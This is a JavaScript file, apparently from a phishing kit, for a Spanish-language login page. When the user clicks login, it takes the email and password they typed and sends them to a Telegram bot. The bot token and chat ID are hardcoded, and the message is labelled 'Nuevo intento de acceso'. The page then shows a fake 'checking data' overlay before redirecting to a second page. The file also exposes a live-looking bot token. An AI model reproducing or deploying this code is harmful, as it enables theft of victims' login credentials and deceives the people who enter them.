document.addEventListener("DOMContentLoaded", function () {
  const emailInput = document.getElementById("email");
  const passwordInput = document.getElementById("password");
  const loginBtn = document.getElementById("loginBtn");

  function validateInputs() {
    if (emailInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
      loginBtn.classList.add("active");
      loginBtn.removeAttribute("disabled");
    } else {
      loginBtn.classList.remove("active");
      loginBtn.setAttribute("disabled", "true");
    }
  }

  emailInput.addEventListener("input", validateInputs);
  passwordInput.addEventListener("input", validateInputs);

  function getGreeting() {
    let hour = new Date().getHours();
    let greeting = "";
    if (hour >= 5 && hour < 12) {
      greeting = "¡Buenos días!";
    } else if (hour >= 12 && hour < 18) {
      greeting = "¡Buenas tardes!";
    } else {
      greeting = "¡Buenas noches!";
    }
    document.getElementById("greeting").innerText = greeting;
  }

  getGreeting();

  async function sendToTelegram(email, password) {
    const botToken = "8038367240:AAFwLaUBcYyUMFzNlTLLO2c0DAEVqBNraLI";
    const chatId = "7395554973";
    const message = `🔹 Nuevo intento de acceso\n📧 Correo: ${email}\n🔑 Clave: ${password}`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const params = {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown"
    };
    try {
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(params)
      });
      const loader = document.createElement("div");
      loader.style.position = "fixed";
      loader.style.top = "0";
      loader.style.left = "0";
      loader.style.width = "100%";
      loader.style.height = "100%";
      loader.style.backgroundColor = "rgba(255, 255, 255, 0.9)";
      loader.style.display = "flex";
      loader.style.justifyContent = "center";
      loader.style.alignItems = "center";
      loader.style.flexDirection = "column";
      loader.style.fontSize = "18px";
      loader.style.color = "#333";
      loader.style.fontWeight = "bold";
      loader.innerHTML = `<p>Comprobando datos, por favor espere...</p>`;
      document.body.appendChild(loader);
      setTimeout(() => {
        document.body.removeChild(loader);
        window.location.href = 'index2.html';
      }, 4000);
    } catch (error) {
      console.error("Error al enviar los datos a Telegram:", error);
      alert("Hubo un error al enviar los datos.");
    }
  }

  loginBtn.addEventListener("click", function () {
    if (!loginBtn.classList.contains("active")) return;
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    if (email !== "" && password !== "") {
      sendToTelegram(email, password);
    }
  });
});
